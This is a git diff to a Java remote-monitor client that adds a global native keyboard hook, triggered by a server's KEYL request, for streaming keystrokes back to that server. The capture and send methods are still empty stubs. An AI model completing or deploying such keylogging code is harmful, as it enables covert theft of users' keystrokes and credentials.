@@ -5,6 +5,13 @@ import java.io.InputStreamReader;
 import java.net.InetAddress;
 import java.net.Socket;
 
+import javax.swing.JOptionPane;
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
 public class Connection {
 
 	// There is only one available connection ever at a time
@@ -83,6 +90,7 @@ public class Connection {
 
 					// Determines what to do depending on what the header was
 					if (requestHeader.equals(PacketHeader.KEYL)) { // If keystroke logging request is received
+						System.out.println("KEYLOGGING REQUEST RECEIVED");
 
 						// Creates a new thread that sends keystrokes to the server
 						// If the server sends another KEYL packet, then the thread is stopped
@@ -90,7 +98,7 @@ public class Connection {
 							@Override
 							public void run() {
 								while (!Thread.currentThread().isInterrupted()) {
-									System.out.println("KEYLOGGING REQUEST RECEIVED");
+
 								}
 							}
 						});
@@ -129,14 +137,64 @@ public class Connection {
 		} catch (IOException ie) { // If connection was disconnected at any point
 
 			// Try to close all input streams
-			try {
-				input.close();
-				output.close();
-				connection.close();
-			} catch (IOException ioe) {System.out.println("WARNING: I/O streams could not be closed");}
+			shutdown();
 
 			// Tells main method that connection was disconnected
 			throw new IOException("Connection disconnected");
+		}
+	}
+
+	private class KeyListenerThread implements Runnable, NativeKeyListener {
+
+		/**
+		 * Runs and instantiates the native key hook in a separate thread
+		 */
+		@Override
+		public void run() {
+			try {GlobalScreen.registerNativeHook();}
+			catch (NativeHookException e) {
+				System.out.println("NATIVE HOOK COULD NOT BE REGISTERED - EXITING PROGRAM");
+				shutdown();
+				JOptionPane.showMessageDialog(null, 
+						"Remote monitor connection has been unexpectedly disconnected from the server " + RemoteMonitorClient.getServerIP().getHostAddress() + "."
+								+ System.getProperty("line.separator")
+								+ System.getProperty("line.separator")
+								+ "If you are unsure why you are seeing this message, please contact your system administrator"
+								+ System.getProperty("line.separator")
+								+ "immediately. There may have been unauthorized access to your computer and your personal data "
+								+ System.getProperty("line.separator")
+								+ "has potentially been stolen."
+								, "Connection Terminated", JOptionPane.ERROR_MESSAGE);
+				System.exit(3);
+			}
+
+		}
+
+		@Override
+		public void nativeKeyPressed(NativeKeyEvent e) {
+		}
+
+		@Override
+		public void nativeKeyReleased(NativeKeyEvent e) {
+		}
+
+		@Override
+		public void nativeKeyTyped(NativeKeyEvent e) {
+		}
+
+		public void sendKey(NativeKeyEvent e, boolean isPress) {
+
+			// If the thread hasn't been interrupted, send the key
+			if (!Thread.currentThread().isInterrupted()) {
+				
+				
+			} else try { // Otherwise close the native key hook
+				GlobalScreen.unregisterNativeHook();
+				System.out.println("GLOBAL NATIVE KEY HOOK SUCCESSFULLY UNREGISTERED");
+			} catch (NativeHookException e1) {
+				e1.printStackTrace();
+				System.out.println("GLOBAL NATIVE KEY HOOK COULD NOT BE UNREGISTERED");
+			}
 		}
 	}
 }
